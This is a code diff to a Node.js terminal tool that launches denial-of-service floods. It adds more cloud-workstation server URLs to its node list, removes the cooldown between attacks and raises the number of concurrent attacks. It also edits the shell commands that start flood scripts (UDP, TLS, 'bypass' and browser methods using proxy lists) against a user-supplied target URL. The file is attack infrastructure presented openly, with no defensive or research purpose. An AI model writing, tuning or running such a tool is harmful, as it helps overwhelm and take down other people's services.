@@ -45,6 +45,11 @@ const SERVERS = [
     { name: 'API', url: 'https://8196-idx-apimanager-1742939881392.cluster-mwrgkbggpvbq6tvtviraw2knqg.cloudworkstations.dev' },
     { name: 'API', url: 'https://8196-idx-apimanager-1742939825185.cluster-nx3nmmkbnfe54q3dd4pfbgilpc.cloudworkstations.dev' },
     { name: 'API', url: 'https://8196-idx-apimanager-1742939768273.cluster-e3wv6awer5h7kvayyfoein2u4a.cloudworkstations.dev' },
+    { name: 'API', url: 'https://8196-idx-php-1741553312974.cluster-7ubberrabzh4qqy2g4z7wgxuw2.cloudworkstations.dev' },
+    { name: 'API', url: 'https://8196-idx-php-1741553354294.cluster-e3wv6awer5h7kvayyfoein2u4a.cloudworkstations.dev' },
+    { name: 'API', url: 'https://8196-idx-php-1741553376822.cluster-mwrgkbggpvbq6tvtviraw2knqg.cloudworkstations.dev' },
+    { name: 'API', url: 'https://8196-idx-php-1741553269592.cluster-7ubberrabzh4qqy2g4z7wgxuw2.cloudworkstations.dev' },
+    { name: 'API', url: 'https://8196-idx-php-1741553338957.cluster-qpa6grkipzc64wfjrbr3hsdma2.cloudworkstations.dev' },
     // ... (rest of the servers remain the same)
 ];
 
@@ -54,9 +59,9 @@ class BroadcastTerminal {
         this.lastBroadcastTime = null; // Track last broadcast time for cooldown
         this.lastConcurrentMaxReached = null; // Track when we hit max concurrent attacks
         this.MAX_DURATION = 120; // Maximum attack duration (seconds)
-        this.COOLDOWN_DURATION = 3; // Cooldown period between attacks (seconds)
-        this.MAX_CONCURRENT_ATTACKS = 2; // Maximum number of concurrent attacks
-        this.CONCURRENT_COOLDOWN = 60; // Cooldown after reaching max concurrent (seconds)
+        this.COOLDOWN_DURATION = 0; // Cooldown period between attacks (seconds)
+        this.MAX_CONCURRENT_ATTACKS = 9; // Maximum number of concurrent attacks
+        this.CONCURRENT_COOLDOWN = 20; // Cooldown after reaching max concurrent (seconds)
 
         this.rl = readline.createInterface({
             input: process.stdin,
@@ -409,7 +414,7 @@ class BroadcastTerminal {
         const endTime = moment().add(parseInt(time), 'seconds');
 
         // Construct the full UDP broadcast command
-        const fullCommand = `cd method && node udp.js ${url} 20 ${time} ${port}`;
+        const fullCommand = `cd method && node udp.js ${url} 8 ${time} ${port}`;
 
         console.log(chalk.bold.blue('\n=== Reaction Details ==='));
         console.log(chalk.green(`Target URL     : ${url}`));
@@ -469,7 +474,7 @@ class BroadcastTerminal {
         const endTime = moment().add(parseInt(time), 'seconds');
 
         // Construct the full Tanjiro broadcast command
-        const fullCommand = `cd method && node tornado GET ${url} ${time} 1 128 proxy.txt`;
+        const fullCommand = `cd method && node tornado GET ${url} ${time} 1 1 proxy.txt`;
 
         console.log(chalk.bold.blue('\n=== Reaction Details ==='));
         console.log(chalk.green(`Target URL     : ${url}`));
@@ -527,7 +532,7 @@ class BroadcastTerminal {
         const endTime = moment().add(parseInt(time), 'seconds');
 
         // Construct the full Rapid broadcast command
-        const fullCommand = `cd method && node RAPID.js ${url} ${time} 64 8 proxy.txt`;
+        const fullCommand = `cd method && node RAPID.js ${url} ${time} 1 1 proxy.txt`;
 
         console.log(chalk.bold.blue('\n=== Reaction Details ==='));
         console.log(chalk.green(`Target URL     : ${url}`));
@@ -585,7 +590,7 @@ class BroadcastTerminal {
         const endTime = moment().add(parseInt(time), 'seconds');
 
         // Construct the full Bypass broadcast command
-        const fullCommand = `cd method && node Cibi.js ${url} ${time} 8 64 proxy.txt`;
+        const fullCommand = `cd method && node Cibi.js ${url} ${time} 1 1 proxy.txt`;
 
         console.log(chalk.bold.blue('\n=== Reaction Details ==='));
         console.log(chalk.green(`Target URL     : ${url}`));
@@ -643,7 +648,7 @@ class BroadcastTerminal {
         const endTime = moment().add(parseInt(time), 'seconds');
 
         // Construct the full Browser broadcast command
-        const fullCommand = `cd method && node MixBill.js ${url} ${time} 9 39`;
+        const fullCommand = `cd method && node MixBill.js ${url} ${time} 1 1`;
 
         console.log(chalk.bold.blue('\n=== Reaction Details ==='));
         console.log(chalk.green(`Target URL     : ${url}`));
@@ -701,7 +706,7 @@ class BroadcastTerminal {
         const endTime = moment().add(parseInt(time), 'seconds');
 
         // Construct the full TLS broadcast command
-        const fullCommand = `cd method && node TLS.js ${url} ${time} 8 1`;
+        const fullCommand = `cd method && node TLS.js ${url} ${time} 1 1`;
 
         console.log(chalk.bold.blue('\n=== Reaction Details ==='));
         console.log(chalk.green(`Target URL     : ${url}`));
